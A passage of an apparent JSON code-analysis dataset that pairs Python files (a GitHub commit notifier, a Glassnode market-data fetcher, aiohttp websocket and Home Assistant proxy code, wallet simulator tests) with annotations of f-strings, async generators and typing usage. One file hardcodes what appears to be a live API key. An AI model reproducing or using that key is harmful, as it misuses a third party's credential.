                        36,
                        "'{user}/{repo}'.format(**info)"
                    ],
                    [
                        53,
                        "'{user}/{repo}'.format(**info)"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        31,
                        67,
                        "async for",
                        "async for sub in db.subscribers.find({}, qfilter):\n            for info in sub['git']:\n                logging.debug('GIT: {}'.format(info))\n                known = await db.git.distinct(\n                    'commits.id',\n                    {'id': '{user}/{repo}'.format(**info)}\n                )\n                data = await getCommits(info['user'], info['repo'])\n                digest = [\n                    '\\nNew commit(s) on {}/{}'.format(\n                        info['user'], info['repo']\n                    )\n                ]\n                for commit in data:\n                    if commit['id'] not in known:\n                        if len(known) >= 1:\n                            msg = '{}\\n{}'.format(\n                                commit['message'],\n                                commit['url']\n                            )\n                            digest.append(msg)\n                        result = await db.git.update_one(\n                            {'id': '{user}/{repo}'.format(**info)},\n                            {'$push': {'commits': commit}},\n                            upsert=True\n                        )\n                        logging.debug('Upsert: {}'.format(result))\n                if len(digest) >= 2:\n                    payload = {\n                        'to': sub['user'],\n                        'msg': '\\n\\n'.join(digest),\n                        'type': 'git',\n                    }\n                    logging.debug('payload={}'.format(payload))\n                    sock = create_connection(('192.168.1.200', 8888))\n                    sock.send(msgpack.packb(payload))\n                    sock.close()"
                    ]
                ],
                "pep_498v": [
                    [
                        13,
                        13,
                        ".format()"
                    ],
                    [
                        69,
                        69,
                        ".format()"
                    ],
                    [
                        33,
                        33,
                        ".format()"
                    ],
                    [
                        40,
                        42,
                        ".format()"
                    ],
                    [
                        64,
                        64,
                        ".format()"
                    ],
                    [
                        36,
                        36,
                        ".format()"
                    ],
                    [
                        47,
                        50,
                        ".format()"
                    ],
                    [
                        57,
                        57,
                        ".format()"
                    ],
                    [
                        53,
                        53,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        10,
                        "        url = f'https://api.github.com/repos/{user}/{repo}/commits'"
                    ]
                ]
            }
        },
        "27": {
            "file": "import logging\nimport asyncio\nimport aiohttp\nfrom aioTraceConfig import RequestTrace\nlogger = logging.getLogger('aioTraceConfig')\nasync def fetch_while(_session, url, pars):\n    async with _session.get(url, params=pars, chunked=True) as response:\n        _rebuild = bytearray(b\"\")\n        while True:\n            chunk = memoryview(await response.content.readany())\n            if not chunk:\n                break\n            _rebuild += chunk\n        return memoryview(_rebuild)\nasync def fetch_for(_session, url, pars):\n    async with _session.get(url, params=pars, chunked=True) as response:\n        _rebuild = bytearray(b\"\")\n        async for _chunk in response.content.iter_any():\n            _rebuild += memoryview(_chunk).tobytes()\n        return memoryview(_rebuild)\nasync def rest_client(func, endpts, params):\n    _request_trace = RequestTrace()\n    async with aiohttp.ClientSession(\n        trace_configs=[_request_trace()], raise_for_status=True\n    ) as client_sesh:\n        _task_while = (asyncio.create_task(func(client_sesh, url, params)) for url in endpts)\n        await asyncio.gather(*_task_while)\nasync def foobars(*args, ran=1, sleepy=10.0):\n    logger.info(f'{args[0]}')\n    for irx in range(ran):\n        if irx > 0:\n            await asyncio.sleep(sleepy)\n        await rest_client(*args)\n        logger.info(f\"EOL\\n\")\nENDPOINTS = [\n    'https://api.glassnode.com/v1/metrics/market/price_usd',\n    'https://api.glassnode.com/v1/metrics/market/price_usd_close',\n    'https://api.glassnode.com/v1/metrics/market/price_usd_ohlc',\n    'https://api.glassnode.com/v1/metrics/market/price_drawdown_relative',\n    'https://api.glassnode.com/v1/metrics/market/marketcap_usd',\n]\nPARAMETERS = {\n    'a': 'BTC',\n    'i': '24h',\n    'f': 'JSON',\n    'timestamp_format': 'humanized',\n    'api_key': '1seRHBIi9I7zVbVFyKFdy44l33z'\n}\nif __name__ == '__main__':\n    loops = asyncio.get_event_loop()\n    loops.run_until_complete(foobars(fetch_for, ENDPOINTS, PARAMETERS))",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        18,
                        19,
                        "async for",
                        "async for _chunk in response.content.iter_any():\n            _rebuild += memoryview(_chunk).tobytes()"
                    ]
                ],
                "pep_498": [
                    [
                        29,
                        "    logger.info(f'{args[0]}')"
                    ],
                    [
                        34,
                        "        logger.info(f\"EOL\\n\")"
                    ]
                ]
            }
        },
        "28": {
            "file": "import asyncio\nimport json\nimport os\nimport aiohttp.web\nimport aiohttp_jinja2\nimport jinja2\nfrom web.api import GenrecAPI\nfrom web.server.downloader import DownloaderAPI\nHOST = os.getenv('HOST', '0.0.0.0')\nPORT = int(os.getenv('PORT', 8080))\ngenrec_api = GenrecAPI()\nclassifiers = genrec_api.get_available_classifiers('gtzan')['gtzan']['classifiers'] \nyt_api = DownloaderAPI()\ndef make_reply(req_type, msg, success=True):\n    return json.dumps({\n        'command' : req_type[:-3] + \"REP\",\n        'success' : success,\n        'message': msg,\n    })\nasync def websocket_handler(request):\n    print('Websocket connection starting')\n    ws = aiohttp.web.WebSocketResponse() \n    await ws.prepare(request)\n    print('Websocket connection ready')\n    async for msg in ws:\n        if msg.type != aiohttp.WSMsgType.TEXT:\n            print('ERROR: Invalid message type')\n            continue\n        try:\n            request = json.loads(msg.data)\n            print(request)\n            command  = request.get('command')\n            if command == \"VALIDATE_URL_REQ\":\n                url = request.get('url')\n                videoId = yt_api.is_url_valid(url)\n                if videoId:\n                    await ws.send_str(\n                        make_reply(command, \"Url is valid. Will start download!\")\n                    )\n                    yt_api.download(videoId, url)\n                else:\n                    await ws.send_str(\n                        make_reply(command, \"Invalid youtube URL!\", success=False)\n                    )\n            elif command == \"PREDICT_REQ\":\n                print(\"Prediction request\")\n                videoId = request.get('videoId')\n                classifier = request.get('classifier')\n                dataset = request.get('dataset')\n                print(videoId, classifier, dataset)\n                filepath = yt_api.get_filepath(videoId)\n                prediction_json = genrec_api.predict_song(filepath, dataset, classifier)\n                prediction_json.update({\n                    'command': 'PREDICT_REP',\n                    'success': True,\n                })\n                await ws.send_str(\n                    json.dumps(prediction_json)\n                )\n        except Exception as ex:\n            print(f\"ERROR: {ex.msg}\")\n            await ws.send_str(\n                make_reply(NACK, ex.msg)\n            )\n    return ws\n@aiohttp_jinja2.template('index.html')\nasync def index_handler(request):\n    return { 'classifiers': classifiers }\ndef main():\n    path_to_static_folder = os.path.join(os.getcwd(), 'web/server/static/')\n    loop = asyncio.get_event_loop()\n    app = aiohttp.web.Application(loop=loop)\n    aiohttp_jinja2.setup(app,\n        loader=jinja2.FileSystemLoader(path_to_static_folder))\n    app.router.add_route('GET', '/ws', websocket_handler)\n    app.router.add_route('GET', '/', index_handler)\n    app.router.add_static('/static', path_to_static_folder, name='static', show_index=True, follow_symlinks=True)\n    aiohttp.web.run_app(app, host=HOST, port=PORT)\nif __name__ == '__main__':\n    main()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        25,
                        64,
                        "async for",
                        "async for msg in ws:\n        if msg.type != aiohttp.WSMsgType.TEXT:\n            print('ERROR: Invalid message type')\n            continue\n        try:\n            request = json.loads(msg.data)\n            print(request)\n            command  = request.get('command')\n            if command == \"VALIDATE_URL_REQ\":\n                url = request.get('url')\n                videoId = yt_api.is_url_valid(url)\n                if videoId:\n                    await ws.send_str(\n                        make_reply(command, \"Url is valid. Will start download!\")\n                    )\n                    yt_api.download(videoId, url)\n                else:\n                    await ws.send_str(\n                        make_reply(command, \"Invalid youtube URL!\", success=False)\n                    )\n            elif command == \"PREDICT_REQ\":\n                print(\"Prediction request\")\n                videoId = request.get('videoId')\n                classifier = request.get('classifier')\n                dataset = request.get('dataset')\n                print(videoId, classifier, dataset)\n                filepath = yt_api.get_filepath(videoId)\n                prediction_json = genrec_api.predict_song(filepath, dataset, classifier)\n                prediction_json.update({\n                    'command': 'PREDICT_REP',\n                    'success': True,\n                })\n                await ws.send_str(\n                    json.dumps(prediction_json)\n                )\n        except Exception as ex:\n            print(f\"ERROR: {ex.msg}\")\n            await ws.send_str(\n                make_reply(NACK, ex.msg)\n            )"
                    ]
                ],
                "pep_498": [
                    [
                        61,
                        "            print(f\"ERROR: {ex.msg}\")"
                    ]
                ]
            }
        },
        "29": {
            "file": "import asyncio\nfrom typing import Any, Dict\nimport httpx\nimport pytest\nfrom asgi_lifespan import LifespanManager\nfrom fastapi import status\nfrom chapter9.chapter9_app_external_api import app, external_api\nclass MockExternalAPI:\n    mock_data = {\n        \"data\": [\n            {\n                \"employee_age\": 61,\n                \"employee_name\": \"Tiger Nixon\",\n                \"employee_salary\": 320800,\n                \"id\": 1,\n                \"profile_image\": \"\",\n            }\n        ],\n        \"status\": \"success\",\n        \"message\": \"Success\",\n    }\n    async def __call__(self) -> Dict[str, Any]:\n        return MockExternalAPI.mock_data\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n    loop.close()\n@pytest.fixture\nasync def test_client():\n    app.dependency_overrides[external_api] = MockExternalAPI()\n    async with LifespanManager(app):\n        async with httpx.AsyncClient(app=app, base_url=\"http://app.io\") as test_client:\n            yield test_client\n@pytest.mark.asyncio\nasync def test_get_employees(test_client: httpx.AsyncClient):\n    response = await test_client.get(\"/employees\")\n    assert response.status_code == status.HTTP_200_OK\n    json = response.json()\n    assert json == MockExternalAPI.mock_data",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        2,
                        "from typing import Any, Dict",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        30,
                        34,
                        "async generator",
                        "async def test_client():\n    app.dependency_overrides[external_api] = MockExternalAPI()\n    async with LifespanManager(app):\n        async with httpx.AsyncClient(app=app, base_url=\"http://app.io\") as test_client:\n            yield test_client"
                    ]
                ]
            }
        },
        "30": {
            "file": "import asyncio\nfrom ipaddress import ip_address\nimport logging\nfrom typing import Dict, Union\nimport aiohttp\nfrom aiohttp import hdrs, web\nfrom aiohttp.web_exceptions import HTTPBadGateway, HTTPUnauthorized\nfrom multidict import CIMultiDict\nfrom homeassistant.components.http import HomeAssistantView\nfrom homeassistant.core import callback\nfrom homeassistant.helpers.typing import HomeAssistantType\nfrom .const import X_HASSIO, X_INGRESS_PATH\n_LOGGER = logging.getLogger(__name__)\nDOMAIN = \"ais_web_zigbee2mqtt\"\n@callback\ndef async_setup_ingress_view(hass: HomeAssistantType, host: str, port: int):\n    websession = hass.helpers.aiohttp_client.async_get_clientsession()\n    hassio_ingress = HassIOIngress(hass, host, port, websession)\n    hass.http.register_view(hassio_ingress)\nclass HassIOIngress(HomeAssistantView):\n    name = \"api:zigbee2mqtt\"\n    url = \"/api/zigbee2mqtt/{token}/{path:.*}\"\n    requires_auth = False\n    def __init__(\n        self,\n        hass: HomeAssistantType,\n        host: str,\n        port: int,\n        websession: aiohttp.ClientSession,\n    ):\n        self._host = host\n        self._port = port\n        self._hass = hass\n        self._websession = websession\n        self._valid_token = \"\"\n    def _create_url(self, token: str, path: str) -> str:\n        return f\"http://{self._host}:{self._port}/{path}\"\n    async def _handle(\n        self, request: web.Request, token: str, path: str\n    ) -> Union[web.Response, web.StreamResponse, web.WebSocketResponse]:\n        if token != self._valid_token:\n            try:\n                auth = self._hass.auth\n                refresh_token = await auth.async_validate_access_token(token)\n                if refresh_token is None:\n                    raise HTTPUnauthorized() from None\n                self._valid_token = token\n            except Exception:\n                raise HTTPUnauthorized() from None\n        try:\n            if _is_websocket(request):\n                return await self._handle_websocket(request, token, path)\n            return await self._handle_request(request, token, path)\n        except aiohttp.ClientError as err:\n            _LOGGER.debug(\"Ingress error with %s / %s: %s\", token, path, err)\n        raise HTTPBadGateway() from None\n    get = _handle\n    post = _handle\n    put = _handle\n    delete = _handle\n    patch = _handle\n    options = _handle\n    async def _handle_websocket(\n        self, request: web.Request, token: str, path: str\n    ) -> web.WebSocketResponse:\n        if hdrs.SEC_WEBSOCKET_PROTOCOL in request.headers:\n            req_protocols = [\n                str(proto.strip())\n                for proto in request.headers[hdrs.SEC_WEBSOCKET_PROTOCOL].split(\",\")\n            ]\n        else:\n            req_protocols = ()\n        ws_server = web.WebSocketResponse(\n            protocols=req_protocols, autoclose=False, autoping=False\n        )\n        await ws_server.prepare(request)\n        url = self._create_url(token, path)\n        source_header = _init_header(request, token)\n        if request.query_string:\n            url = f\"{url}?{request.query_string}\"\n        async with self._websession.ws_connect(\n            url,\n            headers=source_header,\n            protocols=req_protocols,\n            autoclose=False,\n            autoping=False,\n        ) as ws_client:\n            await asyncio.wait(\n                [\n                    asyncio.create_task(_websocket_forward(ws_server, ws_client)),\n                    asyncio.create_task(_websocket_forward(ws_client, ws_server)),\n                ],\n                return_when=asyncio.FIRST_COMPLETED,\n            )\n        return ws_server\n    async def _handle_request(\n        self, request: web.Request, token: str, path: str\n    ) -> Union[web.Response, web.StreamResponse]:\n        url = self._create_url(token, path)\n        data = await request.read()\n        source_header = _init_header(request, token)\n        async with self._websession.request(\n            request.method,\n            url,\n            headers=source_header,\n            params=request.query,\n            allow_redirects=False,\n            data=data,\n        ) as result:\n            headers = _response_header(result)\n            if (\n                hdrs.CONTENT_LENGTH in result.headers\n                and int(result.headers.get(hdrs.CONTENT_LENGTH, 0)) < 4194000\n            ):\n                body = await result.read()\n                return web.Response(\n                    headers=headers,\n                    status=result.status,\n                    content_type=result.content_type,\n                    body=body,\n                )\n            response = web.StreamResponse(status=result.status, headers=headers)\n            response.content_type = result.content_type\n            try:\n                await response.prepare(request)\n                async for data in result.content.iter_chunked(4096):\n                    await response.write(data)\n            except (aiohttp.ClientError, aiohttp.ClientPayloadError) as err:\n                _LOGGER.debug(\"Stream error %s / %s: %s\", token, path, err)\n            return response\ndef _init_header(\n    request: web.Request, token: str\n) -> Union[CIMultiDict, Dict[str, str]]:\n    headers = {}\n    for name, value in request.headers.items():\n        if name in (\n            hdrs.CONTENT_LENGTH,\n            hdrs.CONTENT_ENCODING,\n            hdrs.SEC_WEBSOCKET_EXTENSIONS,\n            hdrs.SEC_WEBSOCKET_PROTOCOL,\n            hdrs.SEC_WEBSOCKET_VERSION,\n            hdrs.SEC_WEBSOCKET_KEY,\n        ):\n            continue\n        headers[name] = value\n    headers[X_HASSIO] = token\n    headers[X_INGRESS_PATH] = f\"/api/zigbee2mqtt/{token}\"\n    forward_for = request.headers.get(hdrs.X_FORWARDED_FOR)\n    connected_ip = ip_address(request.transport.get_extra_info(\"peername\")[0])\n    if forward_for:\n        forward_for = f\"{forward_for}, {connected_ip!s}\"\n    else:\n        forward_for = f\"{connected_ip!s}\"\n    headers[hdrs.X_FORWARDED_FOR] = forward_for\n    forward_host = request.headers.get(hdrs.X_FORWARDED_HOST)\n    if not forward_host:\n        forward_host = request.host\n    headers[hdrs.X_FORWARDED_HOST] = forward_host\n    forward_proto = request.headers.get(hdrs.X_FORWARDED_PROTO)\n    if not forward_proto:\n        forward_proto = request.url.scheme\n    headers[hdrs.X_FORWARDED_PROTO] = forward_proto\n    return headers\ndef _response_header(response: aiohttp.ClientResponse) -> Dict[str, str]:\n    headers = {}\n    for name, value in response.headers.items():\n        if name in (\n            hdrs.TRANSFER_ENCODING,\n            hdrs.CONTENT_LENGTH,\n            hdrs.CONTENT_TYPE,\n            hdrs.CONTENT_ENCODING,\n        ):\n            continue\n        headers[name] = value\n    return headers\ndef _is_websocket(request: web.Request) -> bool:\n    headers = request.headers\n    if (\n        \"upgrade\" in headers.get(hdrs.CONNECTION, \"\").lower()\n        and headers.get(hdrs.UPGRADE, \"\").lower() == \"websocket\"\n    ):\n        return True\n    return False\nasync def _websocket_forward(ws_from, ws_to):\n    try:\n        async for msg in ws_from:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                await ws_to.send_str(msg.data)\n            elif msg.type == aiohttp.WSMsgType.BINARY:\n                await ws_to.send_bytes(msg.data)\n            elif msg.type == aiohttp.WSMsgType.PING:\n                await ws_to.ping()\n            elif msg.type == aiohttp.WSMsgType.PONG:\n                await ws_to.pong()\n            elif ws_to.closed:\n                await ws_to.close(code=ws_to.close_code, message=msg.extra)\n    except RuntimeError:\n        _LOGGER.debug(\"Ingress Websocket runtime error\")\nasync def async_setup(hass, config):\n    config = config.get(DOMAIN, {})\n    host = config.get(\"host\")\n    port = config.get(\"port\")\n    async_setup_ingress_view(hass, host, port)\n    return True",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        4,
                        "from typing import Dict, Union",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        164,
                        "def _response_header(response: aiohttp.ClientResponse) -> Dict[str, str]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        186,
                        196,
                        "async for",
                        "async for msg in ws_from:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                await ws_to.send_str(msg.data)\n            elif msg.type == aiohttp.WSMsgType.BINARY:\n                await ws_to.send_bytes(msg.data)\n            elif msg.type == aiohttp.WSMsgType.PING:\n                await ws_to.ping()\n            elif msg.type == aiohttp.WSMsgType.PONG:\n                await ws_to.pong()\n            elif ws_to.closed:\n                await ws_to.close(code=ws_to.close_code, message=msg.extra)"
                    ],
                    [
                        126,
                        127,
                        "async for",
                        "async for data in result.content.iter_chunked(4096):\n                    await response.write(data)"
                    ]
                ],
                "pep_498": [
                    [
                        147,
                        "    headers[X_INGRESS_PATH] = f\"/api/zigbee2mqtt/{token}\""
                    ],
                    [
                        37,
                        "        return f\"http://{self._host}:{self._port}/{path}\""
                    ],
                    [
                        151,
                        "        forward_for = f\"{forward_for}, {connected_ip!s}\""
                    ],
                    [
                        153,
                        "        forward_for = f\"{connected_ip!s}\""
                    ],
                    [
                        80,
                        "            url = f\"{url}?{request.query_string}\""
                    ]
                ]
            }
        },
        "31": {
            "file": "import asyncio\nimport pytest\nimport time\nfrom tst.consensus.block_rewards import calculate_base_farmer_reward, calculate_pool_reward\nfrom tst.protocols.full_node_protocol import RespondBlock\nfrom tst.server.server import TstServer\nfrom tst.simulator.simulator_protocol import FarmNewBlockProtocol, ReorgProtocol\nfrom tst.types.peer_info import PeerInfo\nfrom tst.util.ints import uint16, uint32, uint64\nfrom tst.wallet.util.transaction_type import TransactionType\nfrom tst.wallet.transaction_record import TransactionRecord\nfrom tst.wallet.wallet_node import WalletNode\nfrom tst.wallet.wallet_state_manager import WalletStateManager\nfrom tests.setup_nodes import self_hostname, setup_simulators_and_wallets\nfrom tests.time_out_assert import time_out_assert, time_out_assert_not_none\nfrom tests.wallet.cc_wallet.test_cc_wallet import tx_in_pool\n@pytest.fixture(scope=\"module\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\nclass TestWalletSimulator:\n    @pytest.fixture(scope=\"function\")\n    async def wallet_node(self):\n        async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def two_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def two_wallet_nodes_five_freeze(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def three_sim_two_wallets(self):\n        async for _ in setup_simulators_and_wallets(3, 2, {}):\n            yield _\n    @pytest.mark.asyncio\n    async def test_wallet_coinbase(self, wallet_node):\n        num_blocks = 10\n        full_nodes, wallets = wallet_node\n        full_node_api = full_nodes[0]\n        server_1: TstServer = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_block(FarmNewBlockProtocol(ph))\n        await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, num_blocks + 2)\n            ]\n        )\n        async def check_tx_are_pool_farm_rewards():\n            wsm: WalletStateManager = wallet_node.wallet_state_manager\n            all_txs = await wsm.get_all_transactions(1)\n            expected_count = (num_blocks + 1) * 2\n            if len(all_txs) != expected_count:\n                return False\n            pool_rewards = 0\n            farm_rewards = 0\n            for tx in all_txs:\n                if tx.type == TransactionType.COINBASE_REWARD:\n                    pool_rewards += 1\n                elif tx.type == TransactionType.FEE_REWARD:\n                    farm_rewards += 1\n            if pool_rewards != expected_count / 2:\n                return False\n            if farm_rewards != expected_count / 2:\n                return False\n            return True\n        await time_out_assert(10, check_tx_are_pool_farm_rewards, True)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n    @pytest.mark.asyncio\n    async def test_wallet_make_transaction(self, two_wallet_nodes):\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_api = full_nodes[0]\n        server_1 = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds)\n        tx = await wallet.generate_signed_transaction(\n            10,\n            await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash(),\n            0,\n        )\n        await wallet.push_transaction(tx)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds - 10)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        new_funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, (2 * num_blocks))\n            ]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, new_funds - 10)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, new_funds - 10)\n    @pytest.mark.asyncio\n    async def test_wallet_coinbase_reorg(self, wallet_node):\n        num_blocks = 5\n        full_nodes, wallets = wallet_node\n        full_node_api = full_nodes[0]\n        fn_server = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(fn_server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await full_node_api.reorg_from_index_to_new_index(ReorgProtocol(uint32(2), uint32(num_blocks + 6), 32 * b\"0\"))\n        funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, num_blocks - 2)\n            ]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n    @pytest.mark.asyncio\n    async def test_wallet_send_to_three_peers(self, three_sim_two_wallets):\n        num_blocks = 10\n        full_nodes, wallets = three_sim_two_wallets\n        wallet_0, wallet_server_0 = wallets[0]\n        full_node_api_0 = full_nodes[0]\n        full_node_api_1 = full_nodes[1]\n        full_node_api_2 = full_nodes[2]\n        full_node_0 = full_node_api_0.full_node\n        full_node_1 = full_node_api_1.full_node\n        full_node_2 = full_node_api_2.full_node\n        server_0 = full_node_0.server\n        server_1 = full_node_1.server\n        server_2 = full_node_2.server\n        ph = await wallet_0.wallet_state_manager.main_wallet.get_new_puzzlehash()\n        await wallet_server_0.start_client(PeerInfo(self_hostname, uint16(server_0._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api_0.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        all_blocks = await full_node_api_0.get_all_full_blocks()\n        for block in all_blocks:\n            await full_node_1.respond_block(RespondBlock(block))\n            await full_node_2.respond_block(RespondBlock(block))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet_0.wallet_state_manager.main_wallet.get_confirmed_balance, funds)\n        tx = await wallet_0.wallet_state_manager.main_wallet.generate_signed_transaction(10, 32 * b\"0\", 0)\n        await wallet_0.wallet_state_manager.main_wallet.push_transaction(tx)\n        await time_out_assert_not_none(5, full_node_0.mempool_manager.get_spendbundle, tx.spend_bundle.name())\n        await wallet_server_0.start_client(PeerInfo(self_hostname, uint16(server_1._port)), wallet_0.on_connect)\n        await time_out_assert_not_none(5, full_node_1.mempool_manager.get_spendbundle, tx.spend_bundle.name())\n        await wallet_server_0.start_client(PeerInfo(self_hostname, uint16(server_2._port)), wallet_0.on_connect)\n        await time_out_assert_not_none(5, full_node_2.mempool_manager.get_spendbundle, tx.spend_bundle.name())\n    @pytest.mark.asyncio\n    async def test_wallet_make_transaction_hop(self, two_wallet_nodes_five_freeze):\n        num_blocks = 10\n        full_nodes, wallets = two_wallet_nodes_five_freeze\n        full_node_api_0 = full_nodes[0]\n        full_node_0 = full_node_api_0.full_node\n        server_0 = full_node_0.server\n        wallet_node_0, wallet_0_server = wallets[0]\n        wallet_node_1, wallet_1_server = wallets[1]\n        wallet_0 = wallet_node_0.wallet_state_manager.main_wallet\n        wallet_1 = wallet_node_1.wallet_state_manager.main_wallet\n        ph = await wallet_0.get_new_puzzlehash()\n        await wallet_0_server.start_client(PeerInfo(self_hostname, uint16(server_0._port)), None)\n        await wallet_1_server.start_client(PeerInfo(self_hostname, uint16(server_0._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api_0.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet_0.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet_0.get_unconfirmed_balance, funds)\n        assert await wallet_0.get_confirmed_balance() == funds\n        assert await wallet_0.get_unconfirmed_balance() == funds\n        tx = await wallet_0.generate_signed_transaction(\n            10,\n            await wallet_node_1.wallet_state_manager.main_wallet.get_new_puzzlehash(),\n            0,\n        )\n        await wallet_0.push_transaction(tx)\n        await time_out_assert(5, wallet_0.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet_0.get_unconfirmed_balance, funds - 10)\n        for i in range(0, 4):\n            await full_node_api_0.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        new_funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, num_blocks + 1)\n            ]\n        )\n        await time_out_assert(5, wallet_0.get_confirmed_balance, new_funds - 10)\n        await time_out_assert(5, wallet_0.get_unconfirmed_balance, new_funds - 10)\n        await time_out_assert(5, wallet_1.get_confirmed_balance, 10)\n        tx = await wallet_1.generate_signed_transaction(5, await wallet_0.get_new_puzzlehash(), 0)\n        await wallet_1.push_transaction(tx)\n        for i in range(0, 4):\n            await full_node_api_0.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        await wallet_0.get_confirmed_balance()\n        await wallet_0.get_unconfirmed_balance()\n        await wallet_1.get_confirmed_balance()\n        await time_out_assert(5, wallet_0.get_confirmed_balance, new_funds - 5)\n        await time_out_assert(5, wallet_0.get_unconfirmed_balance, new_funds - 5)\n        await time_out_assert(5, wallet_1.get_confirmed_balance, 5)\n    @pytest.mark.asyncio\n    async def test_wallet_make_transaction_with_fee(self, two_wallet_nodes):\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_1 = full_nodes[0]\n        wallet_node, server_2 = wallets[0]\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(full_node_1.full_node.server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds)\n        assert await wallet.get_confirmed_balance() == funds\n        assert await wallet.get_unconfirmed_balance() == funds\n        tx_amount = 3200000000000\n        tx_fee = 10\n        tx = await wallet.generate_signed_transaction(\n            tx_amount,\n            await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash(),\n            tx_fee,\n        )\n        fees = tx.spend_bundle.fees()\n        assert fees == tx_fee\n        await wallet.push_transaction(tx)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds - tx_amount - tx_fee)\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        new_funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, num_blocks + 1)\n            ]\n        )\n        await time_out_assert(5, 